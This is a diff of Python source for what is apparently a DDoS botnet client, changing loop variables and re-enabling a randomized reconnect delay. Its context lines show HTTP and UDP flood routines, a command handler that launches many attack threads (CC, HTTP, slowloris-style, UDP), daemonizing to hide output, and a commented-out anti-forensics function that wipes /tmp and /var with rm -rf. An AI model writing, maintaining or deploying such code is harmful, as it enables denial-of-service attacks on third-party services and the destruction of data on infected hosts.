@@ -89,7 +89,7 @@ def HTTP(ip, port, path):
 			for _ in range(10):
 				get_host += strings[random.randint(0,len(strings))]
 			try:
-				for y in range(200):
+				for _ in range(200):
 					get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
 					http = get_host + useragent + accept + connection + "\r\n"
 					s.send(str.encode(http))
@@ -162,7 +162,7 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		sendip=(str(ip),int(port))
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		try:
-			for y in range(200):
+			for _ in range(200):
 				udpbytes = random._urandom(int(size))
 				s.sendto(udpbytes, sendip)
 			s.close()
@@ -215,7 +215,7 @@ def handle(sock):
 						stop = True
 						attack=0
 					stop = False
-					for x in range(int(command[3])):
+					for _ in range(int(command[3])):
 						p = threading.Thread(target=CC, args=(command[1],command[2]))
 						p.start()
 					attack+=1
@@ -224,7 +224,7 @@ def handle(sock):
 						stop = True
 						attack=0
 					stop = False
-					for x in range(int(command[3])):
+					for _ in range(int(command[3])):
 						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
@@ -233,7 +233,7 @@ def handle(sock):
 						stop = True
 						attack=0
 					stop = False
-					for x in range(int(command[3])):
+					for _ in range(int(command[3])):
 						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
 						p.start()
 					attack+=1
@@ -242,7 +242,7 @@ def handle(sock):
 						stop = True
 						attack=0
 					stop = False
-					for x in range(int(command[3])):
+					for _ in range(int(command[3])):
 						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
@@ -279,6 +279,7 @@ def daemon():#daemon
 	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
 	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
 	sys.stderr.close()
+
 '''These function haven't need to use
 def clean_device():#don't use it if u don't want be detected in dbg
 	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
@@ -312,7 +313,7 @@ def single_instance():
 			global kill
 			if kill:
 				break
-			a, addr = s.accept()
+			a, _ = s.accept()
 			a.close()
 	except:
 		try:
@@ -356,7 +357,7 @@ def conn():
 				break
 
 		except:
-			#time.sleep(random.randint(1,60))
+			time.sleep(random.randint(1,60))
 			pass
 
 #xor enc part#
